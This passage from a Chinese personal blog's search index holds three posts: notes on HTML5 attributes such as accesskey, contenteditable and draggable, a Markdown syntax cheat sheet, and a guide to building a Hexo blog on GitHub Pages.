    <content type="text"><![CDATA[临近年关，时间比较多，就看了下html5的东西，发现这些不太常见的属性还是蛮好玩的，记录下，便于今后检索查找。 accesskey&lt;element accesskey=&quot;character&quot;&gt;,绑定快捷键用的，通过Alt + character 就能触发。 几乎所有浏览器均 accesskey 属性，除了 Opera。 支持 accesskey 属性：&lt;a&gt;, &lt;area&gt;, &lt;button&gt;, &lt;input&gt;, &lt;label&gt;, &lt;legend&gt; 以及 &lt;textarea&gt;。 contenteditable与spellcheck&lt;element contenteditable=&quot;true|false&quot;&gt;是元素内容是否可编辑。&lt;element spellcheck=&quot;true|false&quot;&gt;是否对元素进行拼写和语法检查。 所有主流浏览器都支持 contenteditable 属性。 Internet Explorer 9 以及更早的版本不支持 spellcheck 属性。 spellcheck可检测的是 input 元素中的文本值（非密码） &lt;textarea&gt;元素中的文本 可编辑元素中的文本 translate&lt;element translate=&quot;yes|no&quot;&gt;规定不应翻译某些元素。 基本上浏览器都不支持。测试当前新版本chrome是支持的。 推荐使用class=&quot;notranslate&quot;代替。 1234&lt;p class="notranslate"&gt;class="notranslate"&lt;/p&gt;&lt;p notranslate="no"&gt;notranslate&lt;/p&gt;&lt;p notranslate="yes"&gt;translate&lt;/p&gt;&lt;!-- 谷歌翻译的时候，最新版chrome仅最后一条为中文 --&gt; draggable&lt;element draggable=&quot;true|false|auto&quot;&gt;元素是否可以被拖拽。 Internet Explorer 9+, Firefox, Opera, Chrome, and Safari 支持 draggable 属性。 链接和图像默认是可拖动的。 其中有几个要点： DataTransfer 对象：退拽对象用来传递的媒介，使用一般为Event.dataTransfer。 draggable 属性：就是标签元素要设置draggable=true，否则不会有效果 ondragstart 事件：当拖拽元素开始被拖拽的时候触发的事件，此事件作用在被拖曳元素上 ondragenter 事件：当拖曳元素进入目标元素的时候触发的事件，此事件作用在目标元素上 ondragover 事件：拖拽元素在目标元素上移动的时候触发的事件，此事件作用在目标元素上 ondrop 事件：被拖拽的元素在目标元素上同时鼠标放开触发的事件，此事件作用在目标元素上 ondragend 事件：当拖拽完成后触发的事件，此事件作用在被拖曳元素上 Event.preventDefault() 方法：阻止默认的些事件方法等执行。在ondragover中一定要执行preventDefault()，否则ondrop事件不会被触发。另外，如果是从其他应用软件或是文件中拖东西进来，尤其是图片的时候，默认的动作是显示这个图片或是相关信息，并不是真的执行drop。此时需要用document的ondragover事件把它去掉。 Event.effectAllowed 属性：就是拖拽的效果。 参考链接http://www.zhangxinxu.com/wordpress/2011/02/html5-drag-drop-拖拽与拖放简介/http://www.w3school.com.cn/tags/html_ref_standardattributes.asp]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>拖拽</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown 语法]]></title>
    <url>%2Fmarkdown-%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[markDown的常用语法，便于应用于博客，github之类简介中。包含标题、列表、表格、代码块等语法。 标题123456# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 无序列表 list1 list2 list3 123* list1- list2+ list3 有序列表 a b c 1231. a1. b1. c 分级列表 list1 list1-11. list1-1-1 1. list1-1-2 1. list1-1-3 list2 list2-2 list1-2-1 list1-2-2 list1-2-3 list3 1234567891011+ list1 - list1-1 1. list1-1-1 1. list1-1-2 1. list1-1-3+ list2 + list2-2 * list1-2-1 * list1-2-2 * list1-2-3* list3 引用 这里是引用 1&gt; 这里是引用 插入链接baidu 1[baidu](http://www.baidu.com) 插入图片 1![baidu icon](https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo_top_ca79a146.png) 字体这是粗体这也是粗体 12**这是粗体**__这也是粗体__ 这是斜体这也是斜体 12*这是斜体 *_这也是斜体_ 分隔线 1*** 表格 Tables center right col 3 is right-aligned $1600 col 2 is centered $12 zebra stripes are neat $1 12345| Tables | center | right || ------------- |:-------------:| -----:|| col 3 is | right-aligned | $1600 || col 2 is | centered | $12 || zebra stripes | are neat | $1 | 代码这是代码行{} 1`这是代码行&#123;&#125;` 123&#123; 通过```包围代码块&#125; { 四个空格也是代码块或一个tab（Windows） } 删除线我被划掉了 1~~我被划掉了~~ 参考链接http://www.jianshu.com/p/q81RER]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo用法]]></title>
    <url>%2Fhexo%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[搭建属于自己的博客，通过github提供的github page的免费域名，以及hexo框架来快速搭建。目前遇到的问题，以提供解决方案。 前提条件拥有github账号、node以及git。 创建库库名设为gitname.github.io,其中gitname是你的github账号昵称,如下图这里gitname为前面的luckbb。设置guthub page的分支地址 hexo安装配置可参照Hexo https://hexo.io/官网，目前使用的是hexo3.2。 下载hexo1npm install -g hexo-cli 检测hexo1hexo -v 初始化选择一个文件夹，初始化，不填参数在本路径下创建。 1hexo init [folder] _config.yml配置主要的几个参数 1234567# Sitetitle:subtitle:description:author:language: zh-CNtimezone: repo的地址是创建github的代码仓库地址，建议设置ssh配置。 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: git@github.com:gitname/gitname.github.io.git branch: master More info: configuration 新建文件1hexo new "My New Post" More info: Writing 本地运行1hexo server More info: Server 生产静态文件1hexo generate More info: Generating 部署远程站点1hexo deploy More info: Deployment 遇到问题Deployer not found: git1npm install hexo-deployer-git --save More info: deployment 初始化时npm包下载失败网络原因，可直接在初始化文件夹 npm install或者淘宝镜像 next主题标签分类在开启标签/分类时，可能出现路径问题，其主要步骤为 在hexo站点目录。通过指令hexo new page tags/categories，会在source文件下创建tags/categories文件夹，其目录下均有index.md文件 在index.md文件中设置type类型，标签为tags，分类为categories，举例标签如下： 12345---title: 标签date: 2017-10-27type: &quot;tags&quot;--- 修改主题配置文件_config.yml，给菜单添加链接 12345menu: home: / archives: /archives tags: /tags #标签 categories: /categories #分类 More info：next]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
</search>
